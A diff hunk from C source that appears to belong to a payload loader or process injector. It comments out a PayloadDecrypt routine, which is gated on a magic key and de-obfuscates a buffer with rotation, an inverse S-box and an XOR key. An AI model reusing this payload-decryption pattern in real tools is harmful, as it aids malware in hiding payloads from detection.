@@ -55,21 +55,21 @@ DWORD FindPIDByName(wchar_t* processName) {
 
 
 
-void PayloadDecrypt(unsigned char* buffer, int bufferlen, unsigned char* key, int keylen)
-{
-    if (strncmp((char*)keybuffer, (char*)"\xca\xfe\xba\xbe\xde\xad\xc0\xde", 8) != 0)
-    {
-        return;
-    }
-
-
-    for (int i = 0; i < bufferlen; ++i)
-    {
-        buffer[i] = ROTBYTE(buffer[i], 4);
-        buffer[i] = inv_sbox[buffer[i]];
-        buffer[i] ^= key[i % keylen];
-    }
-}
+//void PayloadDecrypt(unsigned char* buffer, int bufferlen, unsigned char* key, int keylen)
+//{
+//    if (strncmp((char*)keybuffer, (char*)"\xca\xfe\xba\xbe\xde\xad\xc0\xde", 8) != 0)
+//    {
+//        return;
+//    }
+//
+//
+//    for (int i = 0; i < bufferlen; ++i)
+//    {
+//        buffer[i] = ROTBYTE(buffer[i], 4);
+//        buffer[i] = inv_sbox[buffer[i]];
+//        buffer[i] ^= key[i % keylen];
+//    }
+//}
 
 #define PAGE_SIZE 0x1000
 #define PAGE_ALIGN(mem) ((mem + PAGE_SIZE - 1) & (~(PAGE_SIZE - 1)))
